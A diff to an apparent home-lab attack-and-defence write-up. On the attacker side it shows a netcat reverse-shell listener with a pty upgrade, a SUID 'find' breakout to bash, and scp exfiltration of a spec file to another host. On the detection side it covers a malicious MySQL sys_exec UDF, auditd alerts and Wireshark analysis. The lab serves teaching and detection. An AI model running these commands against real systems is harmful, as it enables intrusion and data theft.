@@ -150,7 +150,7 @@ Connection received on 192.168.1.10 55712
 Listening on 0.0.0.0 4444
 Connection received on 192.168.1.10 55712
 <span class="orange"><strong>python3 -c "import pty;pty.spawn('/bin/bash')"</strong></span>
-mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ <span class="orange">export TERM=xterm</strong></span>
+mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ <strong>export TERM=xterm</strong></span>
 export TERM=xterm
 mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ ^Z
 [1]+  Stopped                 nc -lvnp 4444
@@ -170,12 +170,12 @@ HOWEVER it still worked for my future endevours.
 ## 07.CD IN TO PROJECT.5527
 
 <pre data-label="CD attempt"><code>
-mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/ls
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/ls
 PROJECT.5527  TOOLS
-mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd PROJECT.5527/
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer$ cd PROJECT.5527/
 bash: cd: PROJECT.5527/: <span class="red"><strong>Permission denied</strong></span>
-mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd TOOLS
-mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer$ cd TOOLS
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/TOOLS$ ls
 <span class="orange"><strong>engineer_find</strong></span>
 </code></pre>
 
@@ -185,7 +185,7 @@ Luckily we notice TOOL folder with a *find* binary inside. We check it out.
 ## 08.Examining the binary
 
 <pre data-label="File Check"><code>
-mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls -l
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/TOOLS$ ls -l
 total 200
 -rw<span class="orange"><strong>s</strong></span>r-xr-<span class="orange"><strong>x</strong></span> 1 lead_engineer lead_engineer 204264 Mar 12 10:39  engineer_find
 </code></pre>
@@ -196,10 +196,10 @@ wich grants the find comand the priviliges of *lead_engineer* upon execution. Th
 ## 09.SUID Privilege Escalation
 
 <pre data-label="SUID breakout"><code>
-mysql@TECH-BUREAU-UBUNTU-24:~/TOOLS$ ./engineer_find . -exec /bin/bash -p \; -quit
-bash-5.2$ whoami
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>~/TOOLS$ ./engineer_find . -exec /bin/bash -p \; -quit
+<span class="orange"><strong>bash-5.2$</strong></span> whoami
 <span class="orange"><strong>lead_engineer</strong></span>
-bash-5.2$ 
+<span class="orange"><strong>bash-5.2$</strong></span> 
 </code></pre>
 
 We use the GTFObins as the code source, this technique is a stealthy living of the land concept.<br>
@@ -209,10 +209,10 @@ so a /bin/bash command is what grants us the shell and the -p flag gives the per
 ## 10.CONFIRM DATA
 
 <pre data-label="SUID breakout"><code>
-bash-5.2$ cd PROJECT.5527/
-bash-5.2$ ls
+<span class="orange"><strong>bash-5.2$</strong></span> cd PROJECT.5527/
+<span class="orange"><strong>bash-5.2$</strong></span> ls
 Frame_specs.txt  <span class="orange"><strong>Valve_specs.txt</strong></span>
-bash-5.2$ cat Valve_specs.txt 
+<span class="orange"><strong>bash-5.2$</strong></span> cat Valve_specs.txt 
 T1s shall use poppet valves!
 (Instead of the normal spool-shaped, sliding valve system.)
 As a cam shaft rotates, either the intake valve or the exhaust valve is opened.
@@ -221,7 +221,7 @@ The process repeats for the exhaust.
 A dedicated exhaust valve is opened, allowing steam to escape the cylinder.
 
 Result: dramatically improved steam-usage efficiency.
-bash-5.2$ 
+<span class="orange"><strong>bash-5.2$</strong></span> 
 </code></pre>
 
 We can now easily access the data filder and check the new file,<br>
@@ -230,7 +230,7 @@ it is accessable and in fact what we are looking for.<br>
 ## 11.SECURE COPY PROTOCOL
 
 <pre data-label="SCP Exfiltration"><code>
-bash-5.2$ scp Valve_specs.txt square@192.168.1.16:~/BUREAU.02/
+<span class="orange"><strong>bash-5.2$ scp Valve_specs.txt square@192.168.1.16:~/BUREAU.02/
 The authenticity of host '192.168.1.16 (192.168.1.16)' can't be established.
 ED25519 key fingerprint is SHA256:4km0uXkh784O7Fc9TGf4Yc8rC2+2ZmvxXSkYLMD8w/Y.
 This key is not known by any other names.
@@ -246,7 +246,7 @@ The data is safeley exfiltrated over an encrypted channel. The Sneak Way.<br>
 ## 12.EXIT
 <pre data-label="Exit"><code>
 exit
-mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ exit
+<span class="orange"><strong>mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/TOOLS$ exit
 exit
 </code></pre>
 
@@ -303,20 +303,36 @@ We can investigate furtehr by checking the http stream.<br>
 
 The contents look quite jumbeled up but in the tail end there we see a /bin/sh string,<br>
 wich would confirm a malicious payload has been sent out to our server.<br>
+#### ‹‹‹ HIDDEN SHELLSCRIPT CONFIRMED ›››
 
-#### ‹‹‹ SHELLSCRIPT CONFIRMED ›››
-
-## 06.
+## 06.ARBITRARY CODE EXECUTION
 
 ![03.SQL-so-execution.png](assets/images/tech-bureau/phase.02/03.SQL-so-execution.png)
 
 <small>'03.SQL-so-execution.png'</small>
 
-This alert in the full log gives an exelent piece of data,<br>
+This alert in the full log section gives an exelent piece of data,<br>
 CREATE FUNCTION sys_exec RETURNS INT SONAME 'sql_updater.so';<br>
-The user admin has infact executed the shellscrip.
+The user admin has infact executed the shared object (.so) file.<br>
 
-#### ‹‹‹ SHELLSCRIPT EXECUTED ›››
+## 15.PCAP ACE-CROSS
+
+![15.a.Wireshark-so-exec.png](assets/images/tech-bureau/phase.02/15.a.Wireshark-so-exec.png)
+
+<small>'15.a.Wireshark-so-exec.png'</small>
+
+We refer to the packet capture and observe the sql traffic.<br>
+And if we check the request querys and look in to the packet details...<br>
+
+## 15b.PCAP DETAILS
+
+![15.b.Wireshark-packet-details.png](assets/images/tech-bureau/phase.02/15.b.Wireshark-packet-details.png)
+
+<small>'15.b.Wireshark-packet-details.png'</small>
+
+We can confirm the exact command that has been envoked.
+
+#### ‹‹‹ HIDDEN SHELLSCRIPT EXECUTED ›››
 
 ## 07.PRIVILEGE ESCALATION VIA SUID
 
@@ -331,17 +347,32 @@ This is proof that the advesary gained the priviliges of user *lead_engineer*.
 
 #### ‹‹‹ PRIVILEGE ESCALATION CONFIRMED ›››
 
-## 05.
+## 05.DATA ACCESSED 
 
 ![05.CAT.png](assets/images/tech-bureau/phase.02/05.CAT.png)
 
 <small>'05.CAT.png'</small>
+As before the auditctl is keeing a watch on our schematic.<br>
+The file has been read.<br>
+#### ‹‹‹ CAT CONFIRMED ›››
 
-## 06...
+## 06.SECURE COPY PROTOCOL
 
 ![06.SCP.png](assets/images/tech-bureau/phase.02/06.SCP.png)
 
 <small>'06.SCP.png'</small>
+
+## 16.PCAP Input/Output GRAPH
+
+![16.Wireshark-Graph.png](assets/images/tech-bureau/phase.02/16.Wireshark-Graph.png)
+
+<small>'16.Wireshark-Graph.png'</small>
+
+This is a good way to check for exfiltration due to the fact that we wont see anything in the<br>
+SSH trafic due to encryption.<br>
+In this somewhat comedic graph we see our tiny text file spiking the ssh trafic volume just before it interupts.<br>
+Exfiltration followed by an ubrupt protocol termination.<br>
+#### ‹‹‹ EXFIILTRATION CONFIRMED ›››
 
 ## 07...
 
@@ -372,28 +403,6 @@ This is proof that the advesary gained the priviliges of user *lead_engineer*.
 ![11.RULE-SCP.png](assets/images/tech-bureau/phase.02/11.RULE-SCP.png)
 
 <small>'11.RULE-SCP.png'</small>
-
-
-
-
-
-## 15...
-
-![15.a.Wireshark-so-exec.png](assets/images/tech-bureau/phase.02/15.a.Wireshark-so-exec.png)
-
-<small>'15.a.Wireshark-so-exec.png'</small>
-
-## 15b...
-
-![15.b.Wireshark-packet-details.png](assets/images/tech-bureau/phase.02/15.b.Wireshark-packet-details.png)
-
-<small>'15.b.Wireshark-packet-details.png'</small>
-
-## 16...
-
-![16.Wireshark-Graph.png](assets/images/tech-bureau/phase.02/16.Wireshark-Graph.png)
-
-<small>'16.Wireshark-Graph.png'</small>
 
 ## LESSONS LEARNED
 #### As the attacker:<br>
